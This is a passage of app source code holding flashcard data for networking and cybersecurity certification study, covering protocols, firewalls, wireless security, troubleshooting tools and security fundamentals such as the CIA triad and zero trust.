              'Exam scenario: "Users can reach the website by IP but not by hostname." DNS issue — A record is likely missing or incorrect. "Email is not being delivered to @company.com." Check MX records. "You need to verify domain ownership for SSL certificate." TXT record is used for this.',
        },
        {
          'label': 'Service',
          'term': 'DHCP — Dynamic Host Configuration Protocol',
          'definition':
              'DHCP automatically assigns IP configuration to clients: IP address, subnet mask, default gateway, DNS servers, lease time. Uses ports 67 (server) and 68 (client). Process: DORA — Discover (client broadcast), Offer (server responds), Request (client accepts), Acknowledge (server confirms).',
          'example':
              'Exam trap: DHCP uses UDP because the client doesn\'t have an IP yet and cannot do TCP. The Discover message is a broadcast (255.255.255.255) since the client doesn\'t know the server\'s address. DORA is the four-step process — memorise the acronym: Discover, Offer, Request, Acknowledge.',
        },
        {
          'label': 'Service',
          'term': 'DHCP Relay Agent',
          'definition':
              'DHCP Discover messages are broadcasts that don\'t cross routers. A DHCP relay agent (usually configured on a router interface) forwards DHCP Discover messages from clients to a centralised DHCP server on another subnet, enabling one server to serve multiple subnets.',
          'example':
              'Scenario: DHCP server is on subnet 10.0.1.0/24. Client is on 10.0.2.0/24. Without relay, the broadcast never reaches the server. With relay configured on the router interface facing 10.0.2.0/24, DHCP Discover is forwarded as unicast to the server. Common exam troubleshooting topic.',
        },
        {
          'label': 'Service',
          'term': 'NAT — Types and Operation',
          'definition':
              'Static NAT: maps one private IP to one public IP permanently. Dynamic NAT: maps private IPs to a pool of public IPs as needed. PAT (Port Address Translation) / NAT Overload: maps many private IPs to one public IP using port numbers to distinguish sessions. PAT is used in virtually all home/office routers.',
          'example':
              'Exam trap: PAT (overloading) is the most common NAT type. It uses Layer 4 port numbers to track multiple connections through a single public IP. Without PAT, a home with 10 devices would need 10 public IPs. With PAT, one public IP handles all 10 devices simultaneously.',
        },
        {
          'label': 'Service',
          'term': 'NTP — Network Time Protocol',
          'definition':
              'NTP synchronises clocks across network devices. Accurate time is critical for: log correlation, certificate validity, Kerberos authentication (fails if clocks are off by more than 5 minutes), and network troubleshooting. NTP uses UDP port 123. Stratum 0 = atomic clock; Stratum 1 = directly connected to stratum 0.',
          'example':
              'Exam scenario: "Users cannot authenticate with Active Directory even with correct credentials." Possible cause: NTP drift — Kerberos authentication fails when the client and server clocks differ by more than 5 minutes. Fix: ensure all devices synchronise to the same NTP source.',
        },
        {
          'label': 'Service',
          'term': 'SNMP — Simple Network Management Protocol',
          'definition':
              'SNMP monitors and manages network devices. Components: Manager (NMS), Agent (runs on device), MIB (Management Information Base — database of device variables). Operations: GET (read a value), SET (change a value), TRAP (unsolicited alert from device to manager). Ports: 161 (agent), 162 (traps).',
          'example':
              'Exam trap: SNMP TRAP is the device proactively alerting the manager — it is NOT a polling operation. GET and GETBULK are polling (manager asks device). TRAP is push-based (device alerts manager when something changes). SNMPv3 adds encryption and authentication — v1/v2 use community strings (insecure).',
        },
        {
          'label': 'Service',
          'term': 'Syslog',
          'definition':
              'Syslog is a standard for sending log messages from network devices to a centralised log server. Severity levels (0–7): 0=Emergency, 1=Alert, 2=Critical, 3=Error, 4=Warning, 5=Notice, 6=Informational, 7=Debug. Lower number = higher severity. Uses UDP port 514.',
          'example':
              'Memory aid: "Every Awesome Cat Eats Warm Noodles In Dallas" (Emergency, Alert, Critical, Error, Warning, Notice, Informational, Debug). A firewall generating level-3 (Error) messages needs immediate attention. Level-7 (Debug) messages are verbose — only enable temporarily for troubleshooting.',
        },
        {
          'label': 'Service',
          'term': 'QoS — Quality of Service',
          'definition':
              'QoS prioritises certain types of traffic to ensure performance for latency-sensitive applications. Traffic is classified and marked using DSCP (Differentiated Services Code Point). Queuing mechanisms (like WFQ, CBWFQ, LLQ) ensure priority traffic is forwarded first during congestion.',
          'example':
              'Scenario: VoIP calls break up when the internet link is congested. QoS solution: mark VoIP packets with DSCP EF (Expedited Forwarding) and place them in a priority queue. Even during congestion, voice packets are forwarded before bulk data transfers.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 5 — Top Exam Traps',
          'definition':
              '1) DNS port 53. DHCP ports 67/68. NTP port 123. SNMP ports 161/162. 2) DORA = DHCP process order. 3) DHCP uses broadcast — needs relay across router. 4) NTP drift >5 min breaks Kerberos. 5) SNMP TRAP is device-initiated (push). GET is manager-initiated (poll). 6) Syslog 0=worst, 7=debug.',
          'example':
              'Quick-fire: What is the DHCP process called? (DORA). What port does SNMP use for traps? (162). What happens if NTP is 10 minutes off on a domain? (Kerberos auth fails). What is APIPA caused by? (DHCP failure). What level is a Syslog Emergency? (0).',
        },
      ];

    // ── Module 06: Network Security ───────────────────────────────────────
    case 'module-06':
      return [
        {
          'label': 'Security',
          'term': 'Firewalls — Types and Operation',
          'definition':
              'Packet filter firewall: inspects individual packets using ACL rules (IP, port, protocol) — stateless. Stateful inspection firewall: tracks connection state — allows return traffic automatically without explicit rules. Next-Generation Firewall (NGFW): deep packet inspection, application awareness, IDS/IPS integration.',
          'example':
              'Exam trap: Stateless firewalls inspect each packet independently — you need explicit rules for both directions. Stateful firewalls track the connection state — once outbound traffic is permitted, return traffic is automatically allowed. NGFW can block Facebook even on port 443 because it inspects the application layer.',
        },
        {
          'label': 'Security',
          'term': 'ACLs — Access Control Lists',
          'definition':
              'ACLs are rules applied to router interfaces to permit or deny traffic based on IP addresses, protocols, and ports. Standard ACL: filters by source IP only. Extended ACL: filters by source IP, destination IP, protocol, and port. Processed top-to-bottom; implicit deny-all at the end.',
          'example':
              'Exam trap: ACLs have an IMPLICIT DENY at the end — if no rule matches, traffic is DENIED. Always end with explicit permit rules for what you want to allow. Standard ACLs should be placed CLOSE to the destination (less specific). Extended ACLs should be placed CLOSE to the source (most specific — drops traffic early).',
        },
        {
          'label': 'Security',
          'term': 'IDS vs IPS',
          'definition':
              'IDS (Intrusion Detection System): monitors traffic and ALERTS on suspicious activity — it does NOT block traffic (passive). IPS (Intrusion Prevention System): monitors traffic and BLOCKS suspicious activity inline (active). IPS must be placed inline; IDS can be passive (tap/span port).',
          'example':
              'Exam trap: IDS detects and reports — it cannot stop an attack by itself. IPS sits inline and can drop malicious packets in real time. If a question asks "what can stop an attack automatically?" — IPS. "What alerts but doesn\'t block?" — IDS. False positives in IPS cause legitimate traffic to be dropped — a critical operational concern.',
        },
        {
          'label': 'Security',
          'term': 'VPN Types — Site-to-Site and Remote Access',
          'definition':
              'Site-to-Site VPN: encrypts traffic between two fixed locations (e.g. HQ and branch) over the internet. Uses IPsec. Remote Access VPN: individual users connect securely to the corporate network. Uses SSL/TLS (e.g. Cisco AnyConnect) or IPsec. Split tunneling: only corporate traffic goes through VPN; internet traffic goes direct.',
          'example':
              'Exam trap: SSL VPN (port 443) is often preferred over IPsec for remote access because it works through firewalls that block non-standard ports. IPsec uses port 500 (IKE) and protocols ESP/AH — often blocked by corporate firewalls. SSL VPN looks like HTTPS and passes through.',
        },
        {
          'label': 'Security',
          'term': 'IPsec — Key Concepts',
          'definition':
              'IPsec provides authentication, integrity, and encryption for IP packets. Two protocols: AH (Authentication Header — integrity and authentication, no encryption) and ESP (Encapsulating Security Payload — encryption, integrity, and authentication). Two modes: Transport (encrypts payload only) and Tunnel (encrypts entire IP packet).',
          'example':
              'Exam trap: AH does NOT encrypt — it only provides integrity. ESP provides BOTH encryption and integrity. For a VPN that needs confidentiality, ESP is required. Tunnel mode (used in site-to-site VPNs) adds a new IP header — the original packet is completely hidden.',
        },
        {
          'label': 'Security',
          'term': '802.1X — Network Access Control',
          'definition':
              '802.1X is a port-based authentication standard that requires devices to authenticate before gaining network access. Components: Supplicant (client device), Authenticator (switch or WAP), Authentication Server (RADIUS). Commonly used to prevent unauthorised devices from connecting to wired or wireless networks.',
          'example':
              'Scenario: An employee plugs in a personal laptop. Without 802.1X, it gets a DHCP address and full network access. With 802.1X, the switch blocks access until the laptop presents valid credentials to the RADIUS server. Only authenticated devices are placed in the correct VLAN.',
        },
        {
          'label': 'Security',
          'term': 'Common Network Attacks',
          'definition':
              'ARP Spoofing: sends fake ARP replies to redirect traffic through attacker (man-in-the-middle). MAC Flooding: fills switch MAC table so it floods all frames (CAM table overflow). VLAN Hopping: exploits trunk/native VLAN misconfiguration to access other VLANs. DHCP Starvation: exhausts IP pool with fake requests.',
          'example':
              'Defences: ARP Spoofing → Dynamic ARP Inspection (DAI). MAC Flooding → port security with MAC limits. VLAN Hopping → change native VLAN to unused VLAN, disable DTP. DHCP Starvation → DHCP Snooping. These countermeasures are paired with their attack types on the exam.',
        },
        {
          'label': 'Security',
          'term': 'AAA — Authentication, Authorisation, and Accounting',
          'definition':
              'Authentication: who are you? (verify identity). Authorisation: what can you do? (permissions). Accounting: what did you do? (audit trail). RADIUS (UDP 1812/1813) and TACACS+ (TCP 49) are the two AAA protocols. TACACS+ encrypts the entire payload; RADIUS only encrypts the password.',
          'example':
              'Exam trap: TACACS+ (Cisco) vs RADIUS: TACACS+ uses TCP (more reliable), encrypts everything, separates authentication and authorisation. RADIUS uses UDP, encrypts only the password, combines authentication and authorisation. TACACS+ is preferred for device administration; RADIUS for network access (VPN, Wi-Fi).',
        },
        {
          'label': 'Security',
          'term': 'PKI and Digital Certificates',
          'definition':
              'PKI (Public Key Infrastructure) uses asymmetric cryptography to establish trust. A Certificate Authority (CA) issues digital certificates that bind a public key to an identity. TLS/HTTPS uses PKI — the web server presents a certificate signed by a trusted CA. Self-signed certificates are not trusted by browsers.',
          'example':
              'Scenario: Users see "certificate not trusted" when visiting an internal web application. The certificate was self-signed rather than issued by a CA trusted by the browsers. Fix: issue the certificate from an internal CA (and distribute the CA cert to clients) or use a public CA.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 6 — Top Exam Traps',
          'definition':
              '1) IDS = detect only; IPS = block inline. 2) ACL implicit deny — always. Standard ACL near destination; Extended ACL near source. 3) AH = integrity only (no encrypt); ESP = encrypt + integrity. 4) TACACS+ encrypts all; RADIUS encrypts password only. 5) 802.1X requires RADIUS for authentication.',
          'example':
              'Quick-fire: What stops a MAC flooding attack? (Port security). What protocol does 802.1X use to communicate with the auth server? (RADIUS). What does IPS do that IDS cannot? (Block traffic inline). What IPsec protocol provides encryption? (ESP). What port does TACACS+ use? (TCP 49).',
        },
      ];

    // ── Module 07: Wireless Networking ───────────────────────────────────
    case 'module-07':
      return [
        {
          'label': 'Wireless',
          'term': 'Wi-Fi Standards — 802.11 Family',
          'definition':
              '802.11a: 5 GHz, up to 54 Mbps. 802.11b: 2.4 GHz, up to 11 Mbps. 802.11g: 2.4 GHz, up to 54 Mbps. 802.11n (Wi-Fi 4): 2.4/5 GHz, up to 600 Mbps, MIMO. 802.11ac (Wi-Fi 5): 5 GHz, multi-Gbps, MU-MIMO. 802.11ax (Wi-Fi 6): 2.4/5/6 GHz, multi-Gbps, OFDMA, improved dense environments.',
          'example':
              'Exam trap: Know the generation names (Wi-Fi 4/5/6) alongside the 802.11 standards. Exam questions may use either. 802.11n introduced MIMO (Multiple Input Multiple Output) — multiple antennas for higher throughput. 802.11ax (Wi-Fi 6) improves performance in crowded environments (airports, stadiums).',
        },
        {
          'label': 'Wireless',
          'term': '2.4 GHz vs 5 GHz',
          'definition':
              '2.4 GHz: longer range, better wall penetration, more interference (microwaves, Bluetooth, neighbouring networks), 3 non-overlapping channels (1, 6, 11). 5 GHz: shorter range, faster speeds, less interference, 24 non-overlapping channels. 6 GHz (Wi-Fi 6E): even more channels, minimal interference.',
          'example':
              'Exam trap: 2.4 GHz has only THREE non-overlapping channels in the US (1, 6, 11). Neighbouring APs on channels 2–5 or 7–10 cause co-channel interference. In a dense deployment, all APs on 2.4 GHz should use channels 1, 6, or 11 only.',
        },
        {
          'label': 'Wireless',
          'term': 'Wireless Security — WPA, WPA2, WPA3',
          'definition':
              'WEP: broken — do not use. WPA: used TKIP — deprecated. WPA2: uses AES-CCMP — current standard, widely deployed. WPA3: uses SAE (Simultaneous Authentication of Equals) replacing PSK — protects against offline dictionary attacks. WPA3 also adds OWE (Opportunistic Wireless Encryption) for open networks.',
          'example':
              'Exam trap: WEP is COMPLETELY broken — it was cracked in minutes using freely available tools. WPA (TKIP) is deprecated. WPA2 (AES-CCMP) is the current minimum. WPA3 is the modern standard — SAE replaces the 4-way handshake, eliminating the vulnerability to PMKID attacks.',
        },
        {
          'label': 'Wireless',
          'term': 'Enterprise vs Personal Wireless Security',
          'definition':
              'Personal (PSK): uses a shared passphrase — all devices use the same key. Simple but if the key leaks, all devices are compromised and the key must be changed. Enterprise (802.1X/EAP): each user authenticates individually with credentials via RADIUS. Compromising one account doesn\'t compromise others.',
          'example':
              'Exam scenario: A company uses WPA2-Personal (PSK). An ex-employee knows the Wi-Fi password. Fix: WPA2/WPA3-Enterprise with 802.1X — each employee has individual credentials that can be revoked without affecting others. Enterprise security doesn\'t require changing the network key when an employee leaves.',
        },
        {
          'label': 'Wireless',
          'term': 'SSID, BSS, ESS',
          'definition':
              'SSID (Service Set Identifier): the network name broadcast by an AP. BSS (Basic Service Set): a single AP and its associated clients — identified by BSSID (AP\'s MAC address). ESS (Extended Service Set): multiple APs sharing the same SSID — enables roaming. IBSS: ad-hoc mode (device-to-device, no AP).',
          'example':
              'Your office has 10 APs all broadcasting "CompanyWiFi" — this is an ESS. Each AP has a unique BSSID (MAC) but the same SSID. As you walk from conference room to office, your device roams from one AP\'s BSS to another seamlessly — the SSID is the same so you stay connected.',
        },
        {
          'label': 'Wireless',
          'term': 'Wireless Controllers and Autonomous APs',
          'definition':
              'Autonomous AP: self-contained, configured individually. Good for small deployments but hard to manage at scale. Controller-Based (Lightweight APs): APs are managed centrally by a Wireless LAN Controller (WLC). Configuration, firmware, and policy pushed from WLC. Used in enterprise environments.',
          'example':
              'Exam scenario: A company has 200 APs spread across 10 buildings. Managing each individually is impractical. A WLC centralises management — firmware updates, SSID changes, and security policies are applied to all 200 APs simultaneously from one console.',
        },
        {
          'label': 'Wireless',
          'term': 'Wireless Interference and Troubleshooting',
          'definition':
              'Common sources of 2.4 GHz interference: microwaves, Bluetooth devices, baby monitors, neighbouring Wi-Fi networks on overlapping channels. Troubleshooting approach: check channel overlap, check signal strength (RSSI), check noise floor, check client density per AP, check for rogue APs.',
          'example':
              'Scenario: Users in the break room have poor Wi-Fi. Investigation shows a microwave oven causes 2.4 GHz interference during lunch. Solutions: move clients to 5 GHz, add an AP closer to the break room, or switch to a non-overlapping channel. Spectrum analysis tools identify interference sources.',
        },
        {
          'label': 'Wireless',
          'term': 'Wireless Attacks and Defences',
          'definition':
              'Evil Twin: rogue AP broadcasting the same SSID as a legitimate AP — users connect and traffic is intercepted. Deauthentication attack: sends forged deauth frames to disconnect clients. Krack Attack: exploits WPA2 4-way handshake. Defence: 802.1X enterprise auth, rogue AP detection, WIDS (Wireless Intrusion Detection).',
          'example':
              'Evil Twin is a classic attack in coffee shops: attacker creates "Starbucks_WiFi" near the legitimate AP. Users auto-connect. All traffic passes through the attacker. Defence: use VPN always on untrusted networks, enable 802.1X so your device only connects to authenticated APs.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 7 — Top Exam Traps',
          'definition':
              '1) 2.4 GHz: 3 non-overlapping channels (1, 6, 11). 2) WEP = broken; WPA = deprecated; WPA2/WPA3 = current. 3) WPA3-SAE protects against offline dictionary attacks. 4) Enterprise auth = 802.1X + RADIUS. 5) 5 GHz = faster, less range; 2.4 GHz = slower, more range.',
          'example':
              'Quick-fire: Which standard is Wi-Fi 6? (802.11ax). What channels avoid overlap on 2.4 GHz? (1, 6, 11). What replaces PSK in WPA3? (SAE). What is an evil twin attack? (Rogue AP mimicking legitimate SSID). What authenticates each user individually in enterprise Wi-Fi? (802.1X/RADIUS).',
        },
      ];

    // ── Module 08: Troubleshooting & Tools ───────────────────────────────
    case 'module-08':
      return [
        {
          'label': 'Methodology',
          'term': 'Structured Troubleshooting Approach',
          'definition':
              'A structured approach prevents random guessing. Common models: 1) Bottom-up (start at Layer 1, work up — good for unknown problems). 2) Top-down (start at Layer 7, work down — good for application issues). 3) Divide-and-conquer (start at Layer 3, go up or down based on findings). 4) Follow-the-path (trace traffic from source to destination).',
          'example':
              'Scenario: User cannot reach a website. Bottom-up: Is the cable plugged in? → Can they ping their default gateway? → Can they resolve DNS? → Can they reach the web server? → Is HTTPS working? Each step isolates the layer at which the problem exists before going further.',
        },
        {
          'label': 'Tool',
          'term': 'ping — ICMP Echo Test',
          'definition':
              'ping sends ICMP Echo Request packets and measures response time and packet loss. Used to verify Layer 3 connectivity and check latency. "ping 127.0.0.1" tests the local TCP/IP stack. "ping gateway" tests the local network. "ping 8.8.8.8" tests internet routing. "ping hostname" also tests DNS.',
          'example':
              'Troubleshooting: User cannot reach google.com. Test sequence: ping 127.0.0.1 (loopback, tests stack) → ping default gateway (tests LAN) → ping 8.8.8.8 (tests internet routing) → ping google.com (tests DNS). First failure identifies the problem layer. Pinging IP succeeds but hostname fails = DNS problem.',
        },
        {
          'label': 'Tool',
          'term': 'traceroute / tracert — Path Discovery',
          'definition':
              'traceroute maps the path packets take to a destination by incrementally increasing TTL values. Each hop responds with ICMP Time Exceeded. Shows each router in the path and round-trip time per hop. Windows: tracert. Linux/Mac: traceroute. High latency at a specific hop identifies where congestion or failure occurs.',
          'example':
              'Traceroute output: Hop 1 (1ms) → Hop 2 (2ms) → Hop 3 (timeout, *) → Hop 4 (timeout, *). Hop 3 timeout likely means that router drops ICMP or there is a routing loop. If all hops after 3 also timeout, the path is broken at hop 3. A single timeout doesn\'t always mean a problem.',
        },
        {
          'label': 'Tool',
          'term': 'nslookup / dig — DNS Troubleshooting',
          'definition':
              'nslookup (Windows/Linux): queries DNS servers to resolve hostnames, check DNS records, and verify which DNS server is being used. dig (Linux/Mac): more powerful DNS query tool with verbose output. Used to troubleshoot DNS resolution failures and verify DNS records.',
          'example':
              'Commands: "nslookup google.com" returns the IP. "nslookup -type=mx company.com" returns mail server records. "dig google.com" shows detailed DNS response. If "nslookup google.com" fails but "ping 8.8.8.8" succeeds, DNS is the problem — not routing.',
        },
        {
          'label': 'Tool',
          'term': 'netstat — Connection and Port Analysis',
          'definition':
              'netstat displays active network connections, listening ports, routing table, and network statistics. Key options: -an (all connections with port numbers), -rn (routing table), -s (statistics by protocol). Used to identify which processes are listening on ports and check for unexpected connections.',
          'example':
              'Security use: "netstat -an" reveals port 4444 is listening — a known malware indicator. "netstat -rn" shows the routing table to verify default gateway. "netstat -an | find ":443"" (Windows) checks if HTTPS is established. Useful for both troubleshooting and security auditing.',
        },
        {
          'label': 'Tool',
          'term': 'Wireshark — Packet Capture and Analysis',
          'definition':
              'Wireshark captures and analyses network traffic at the packet level. Shows full protocol decode for every frame. Used for: diagnosing application issues, analysing protocol behaviour, detecting security anomalies, and verifying encryption. Requires access to the network segment (or a SPAN/mirror port on a switch).',
          'example':
              'Scenario: Users report intermittent HTTPS failures. Wireshark capture shows TCP retransmissions and RST packets during TLS handshake. The RST packets come from a firewall — it is blocking the TLS version being used. Without packet capture, this would have been extremely difficult to diagnose.',
        },
        {
          'label': 'Tool',
          'term': 'SPAN Port / Port Mirroring',
          'definition':
              'A SPAN (Switched Port Analyser) port mirrors traffic from one or more switch ports to another port where a capture device (like Wireshark) is connected. This is necessary because switches only forward frames to their intended destination — without mirroring, you cannot capture other devices\' traffic.',
          'example':
              'Without SPAN: connect Wireshark to a switch port and you only see your own traffic — the switch forwards other frames elsewhere. With SPAN: configure the switch to copy all traffic from target ports to the SPAN port. Now Wireshark sees all traffic on those ports.',
        },
        {
          'label': 'Tool',
          'term': 'arp — ARP Table Inspection',
          'definition':
              'The ARP (Address Resolution Protocol) table maps IP addresses to MAC addresses for local network communication. "arp -a" displays the table. An incomplete ARP entry means the device couldn\'t resolve an IP to a MAC — often indicating the target device is down or unreachable on the local segment.',
          'example':
              'Troubleshooting: Ping to 192.168.1.50 fails. "arp -a" shows no entry for 192.168.1.50 or shows "incomplete." The device is either off, on a different subnet, or there is a Layer 2 issue. An ARP entry that maps to the wrong MAC = ARP spoofing / man-in-the-middle attack.',
        },
        {
          'label': 'Tool',
          'term': 'ipconfig / ifconfig / ip — Interface Configuration',
          'definition':
              'ipconfig (Windows): displays IP configuration — address, subnet mask, gateway, DNS. "ipconfig /all" shows full details including DHCP server and lease info. "ipconfig /release" and "/renew" force DHCP renewal. ifconfig (Linux legacy) / ip addr (Linux modern): same function on Linux.',
          'example':
              'Troubleshooting workflow: "ipconfig" shows 169.254.x.x → DHCP failure. Check DHCP server. "ipconfig /all" shows correct IP but wrong gateway → routing issue. "ipconfig /release && /renew" forces a fresh DHCP lease — solves many connectivity issues after network changes.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 8 — Top Exam Traps',
          'definition':
              '1) ping 127.0.0.1 tests local TCP/IP stack — ICMP is Layer 3, so this verifies Layer 3 and below. 2) traceroute uses increasing TTL — each router responds when TTL=0. 3) Wireshark needs SPAN port to capture others\' traffic on a switch. 4) 169.254.x.x = APIPA = DHCP failure. 5) nslookup tests DNS specifically — not routing.',
          'example':
              'Scenario: ping 8.8.8.8 succeeds but ping google.com fails. What is the problem? (DNS). Scenario: ping gateway fails but ping 127.0.0.1 succeeds. What is the problem? (LAN/Layer 2 — the local network, not the TCP/IP stack). These ping test sequences appear on every networking certification exam.',
        },
      ];

    default:
      return [
        {
          'label': 'Definition',
          'term': 'What is a Network?',
          'definition':
              'A network is a collection of devices connected together to share resources and communicate using standardised protocols.',
          'example':
              'Your home Wi-Fi connects your phone, laptop, and smart TV — that is a local area network (LAN).',
        },
      ];
  }
}

    if (tag == 'Binary Cyber Pro') {
  switch (moduleId) {

    // ── Module 01: Cybersecurity Fundamentals ─────────────────────────────
    case 'module-01':
      return [
        {
          'label': 'Foundation',
          'term': 'The CIA Triad',
          'definition':
              'The CIA Triad is the foundational model of information security: Confidentiality (only authorised parties can access information), Integrity (information is accurate and unaltered), and Availability (information and systems are accessible when needed). Every security control should be evaluated against these three properties.',
          'example':
              'Exam trap: All three properties are equally important — one is not more important than the others except in context. A hospital prioritises Availability (systems must always be up) and Integrity (patient data must be accurate). A law firm prioritises Confidentiality. Context determines which is most critical.',
        },
        {
          'label': 'Foundation',
          'term': 'AAA Security Extension — Non-Repudiation',
          'definition':
              'Beyond CIA, two additional properties matter: Authentication (verify who you are), Authorisation (what you are allowed to do), and Non-Repudiation (you cannot deny having performed an action). Non-repudiation is achieved through digital signatures and audit logs.',
          'example':
              'Scenario: An employee claims they did not approve a financial transfer. If the system has non-repudiation (digital signature tied to their credentials), the approval is cryptographically provable — they cannot deny it. Non-repudiation is critical for financial, legal, and compliance systems.',
        },
        {
          'label': 'Foundation',
          'term': 'Threat vs Vulnerability vs Risk',
          'definition':
              'Threat: a potential cause of harm (e.g. a hacker, a hurricane). Vulnerability: a weakness that can be exploited (e.g. unpatched software, weak password). Risk: the probability and impact of a threat exploiting a vulnerability. Risk = Threat × Vulnerability × Impact. Eliminating vulnerability eliminates risk even if threats exist.',
          'example':
              'Exam trap: A threat without a vulnerability creates no risk. An unpatched server (vulnerability) with no network access (no threat vector) has low risk. A patched server exposed to the internet has low vulnerability despite high threat exposure. Both dimensions must be present for significant risk.',
        },
        {
          'label': 'Foundation',
          'term': 'Defence in Depth',
          'definition':
              'Defence in depth is a layered security strategy where multiple independent security controls protect against the same threat. If one control fails, others remain. Layers include: physical security, network perimeter, host security, application security, and data security.',
          'example':
              'Example: Attacker gains VPN access (perimeter bypassed). Next layer: network segmentation — they can only reach a DMZ segment. Next: host-based firewall on servers. Next: application authentication. Next: data encryption. No single control is relied upon exclusively.',
        },
        {
          'label': 'Principles',
          'term': 'Principle of Least Privilege',
          'definition':
              'Every user, process, or system should have only the minimum permissions needed to perform its function — nothing more. This limits the blast radius of a compromise. An attacker who gains access to a low-privilege account can do less damage than one who gains admin access.',
          'example':
              'Exam scenario: A web application runs as root on a Linux server. When it is compromised, the attacker has root access to the entire system. If the app ran as a limited service account, the attacker would be contained to that account\'s permissions. Least privilege limits compromise scope.',
        },
        {
          'label': 'Principles',
          'term': 'Zero Trust Security Model',
          'definition':
              'Zero Trust operates on the principle: "never trust, always verify." No user or device is trusted by default — even inside the corporate network. Every access request must be authenticated, authorised, and continuously validated. Network location is not sufficient grounds for trust.',
          'example':
              'Traditional model: inside the corporate network = trusted. Zero Trust: even an internal employee on the corporate LAN must authenticate, their device must meet security policy, and their access is limited to what they need. A compromised internal device does not get blanket access to all internal resources.',
        },
        {
          'label': 'Threat landscape',
          'term': 'Threat Actors — Types and Motivations',
          'definition':
              'Script kiddies: low skill, using existing tools, motivated by notoriety. Hacktivists: ideological motivation, target organisations they oppose. Cybercriminals: financially motivated, organised, sophisticated. Nation-state actors: government-sponsored, advanced persistent threats (APTs), espionage or disruption. Insiders: employees with legitimate access.',
          'example':
              'Exam trap: Nation-state actors (APTs) are the most sophisticated and well-resourced threat actors. They use zero-day exploits and operate stealthily for months or years. A ransom demand suggests cybercriminal motivation. Leaked sensitive government documents suggest nation-state or hacktivist.',
        },
        {
          'label': 'Threat landscape',
          'term': 'Attack Surface',
          'definition':
              'The attack surface is the sum of all points where an unauthorised user can try to enter, extract data, or manipulate a system. It includes: software vulnerabilities, exposed network services, user accounts, physical access points, and third-party integrations. Reducing the attack surface is a foundational security practice.',
          'example':
              'Attack surface reduction: disable unused services (remove SSH if not needed), remove unnecessary software, close unused firewall ports, disable default accounts, implement network segmentation. Each removed entry point reduces the attacker\'s opportunities.',
        },
        {
          'label': 'Principles',
          'term': 'Security Governance and Policies',
          'definition':
              'Security governance is the framework of policies, standards, and procedures that guide an organisation\'s security programme. Policy: high-level mandatory requirement (e.g. "all data must be encrypted at rest"). Standard: specific technical requirement implementing a policy. Procedure: step-by-step instructions for implementing a standard.',
          'example':
              'Policy: "Access to sensitive data requires multi-factor authentication." Standard: "MFA must use TOTP or hardware token — SMS is not acceptable." Procedure: "To enrol in MFA: navigate to security.company.com, click Register Device, scan QR code with authenticator app..." Each level gets more specific.',
        },
        {
          'label': 'Exam prep',
          'term': 'Module 1 — Top Exam Traps',
          'definition':
              '1) CIA = Confidentiality, Integrity, Availability. 2) Risk = Threat × Vulnerability × Impact. 3) Zero Trust: never trust, always verify — location doesn\'t grant trust. 4) Least privilege limits breach scope. 5) Nation-state = most sophisticated threat actor. 6) Attack surface reduction is proactive security.',
          'example':
              'Quick-fire: What does CIA stand for? What is the difference between a threat and a vulnerability? What principle says users should only have the minimum access needed? (Least privilege). What model says "never trust, always verify"? (Zero Trust). Can there be risk without vulnerability? (No).',
        },
      ];

    // ── Module 02: Network Security ───────────────────────────────────────
    case 'module-02':
      return [
        {
          'label': 'Network Security',
          'term': 'Firewalls — Stateful vs Stateless vs NGFW',
          'definition':
              'Stateless: inspects each packet independently using ACL rules. Cannot distinguish legitimate return traffic from attacks. Stateful: tracks connection state — allows established connections without explicit rules for return traffic. NGFW: deep packet inspection, application awareness, integrates IPS, URL filtering, and TLS inspection.',
          'example':
              'Stateful advantage: a stateless firewall needs explicit rules for both directions. A stateful firewall allows outbound HTTP and automatically permits the return traffic — reducing rule complexity. NGFW can block specific applications (Zoom, Dropbox) even if they use standard ports.',
        },
        {
          'label': 'Network Security',
          'term': 'DMZ — Demilitarised Zone',
          'definition':
              'A DMZ is a network segment that sits between the public internet and the internal corporate network. Public-facing servers (web, email, DNS) are placed in the DMZ — they are accessible from the internet but separated from internal systems. Two firewalls are best practice: one facing internet, one facing internal network.',
          'example':
              'Scenario: A web server is compromised. If in a DMZ: the attacker reaches the DMZ but the internal network firewall blocks lateral movement. If no DMZ: the compromised web server has direct access to internal databases and file shares. DMZ contains the blast radius of a perimeter breach.',
        },
        {
          'label': 'Network Security',
          'term': 'IDS vs IPS — Placement and Operation',
          'definition':
              'IDS (Intrusion Detection System): passive monitoring — detects and alerts on suspicious traffic patterns using signatures or anomaly detection. Does NOT block traffic. IPS (Intrusion Prevention System): inline — detects and BLOCKS malicious traffic in real time. False positives in IPS drop legitimate traffic.',
          'example':
              'IDS placement: connected to a SPAN port — it sees a copy of all traffic but is not in the traffic path. IPS placement: inline between firewall and internal network — all traffic flows through it. IPS tuning is critical — an overly aggressive rule set causes false positives that block legitimate business traffic.',
        },
        {
          'label': 'Network Security',
          'term': 'Network Segmentation and Microsegmentation',
          'definition':
              'Network segmentation divides a network into zones with controlled access between them (e.g. VLANs, DMZ, guest network). Microsegmentation extends this to the workload level — each server or application has its own security zone with explicit allow rules. Prevents lateral movement after a breach.',
          'example':
              'Traditional flat network: once inside, an attacker can reach all systems. Segmented network: attacker compromises a workstation in VLAN 10 but cannot reach the finance servers in VLAN 20 — the firewall between VLANs blocks lateral movement. Microsegmentation: even servers in the same VLAN cannot communicate without explicit rules.',
        },
        {
          'label': 'Network Security',
          'term': 'VPN Technologies',
          'definition':
              'Site-to-Site VPN: permanent encrypted tunnel between locations over the internet (IPsec). Remote Access VPN: individual user connects to corporate network (SSL/TLS or IPsec). Always-on VPN: client is always connected to VPN regardless of network — no need to manually connect. Split tunnelling: only corporate traffic through VPN.',
          'example':
              'Security risk of split tunnelling: the user\'s device is simultaneously on the corporate VPN and the local coffee shop network. Malware or an attacker on the local network could potentially pivot through the device into the corporate VPN tunnel. Full tunnel VPN routes ALL traffic through corporate, enabling inspection.',
        },
        {
          'label': 'Network Security',
          'term': 'Network Access Control (NAC)',
          'definition':
              'NAC enforces security policy for devices trying to connect to the network. Before granting access, NAC checks: Is the device registered? Is the OS patched? Is antivirus up to date? Is disk encryption enabled? Devices failing policy are quarantined or given restricted access for remediation.',
          'example':
              'Scenario: A contractor\'s personal laptop tries to connect to the corporate network. NAC checks: no managed AV, OS unpatched. NAC places the laptop in a quarantine VLAN with access only to a remediation server. The laptop is denied access to production resources until it meets policy.',
        },
        {
          'label': 'Network Security',
          'term': 'Common Network Attacks',
